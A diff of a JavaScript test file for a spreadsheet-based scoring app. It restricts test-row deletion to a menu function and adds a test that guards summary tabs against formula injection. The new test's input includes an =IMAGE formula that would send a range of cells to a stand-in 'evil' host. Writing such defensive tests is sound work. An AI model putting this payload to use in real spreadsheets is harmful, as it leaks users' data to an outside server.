@@ -423,16 +423,31 @@ describe('teach-back scoring API', () => {
 });
 
 describe('clean-up of test rows', () => {
-  it('deletes only rows whose cohort is TEST, and needs the code', () => {
+  it('deletes only rows whose cohort is TEST, from the menu, and is not part of the public API', () => {
     const env = memoryDeps({ props: { SCORER_CODE: 'code-1234' } });
     check(env, { cohort: 'TEST' });
     check(env, { cohort: 'test', email: 'b@x.io' });
     check(env, { cohort: 'Real' });
     check(env, { audience: 'trainers', cohort: 'TEST' });
-    expect(env.handle({ action: 'deleteTestRows', code: 'nope', device: 'd' })).toMatchObject({ ok: false });
-    const r = env.handle({ action: 'deleteTestRows', code: 'code-1234', device: 'd' });
-    expect(r).toMatchObject({ ok: true, deleted: { participants: 2, trainers: 1, teachBacks: 0 } });
+    expect(env.handle({ action: 'deleteTestRows', code: 'code-1234', device: 'd' })).toMatchObject({ ok: false });
+    expect(Core.deleteTestRows_(env.deps)).toEqual({ participants: 2, trainers: 1, teachBacks: 0 });
     expect(env.table(Core.TABS.pResponses).rows).toHaveLength(1);
+  });
+});
+
+describe('formula injection in the summary tabs', () => {
+  it('never writes a summary or readiness cell that starts like a formula', () => {
+    const env = memoryDeps({ props: { SCORER_CODE: 'code-1234' } });
+    const evil = '=IMAGE("https://evil/?"&B5:B50) Bob';
+    check(env, { name: evil, cohort: '+cohort', right: 3 });
+    check(env, { name: evil, cohort: '+cohort', stage: 'after', right: 8 });
+    check(env, { audience: 'trainers', name: evil, organisation: '@org', cohort: '-ToT' });
+    env.handle({ action: 'submitScore', code: 'code-1234', device: 'd', cohort: '-ToT', scorer: '=Scorer', role: 'peer',
+      part: 'Opening talk', trainee: { name: '=Typed Person', email: 'typed@x.io' }, scores: { timing: 4, clarity: 4, practice: 4, judgment: 4 }, submissionId: sid() });
+    for (const tab of [Core.TABS.pSummary, Core.TABS.tReadiness]) {
+      const cells = env.layouts.get(tab).values.flat().filter((v) => typeof v === 'string');
+      expect(cells.filter((v) => /^[=+\-@]/.test(v))).toEqual([]);
+    }
   });
 });
 
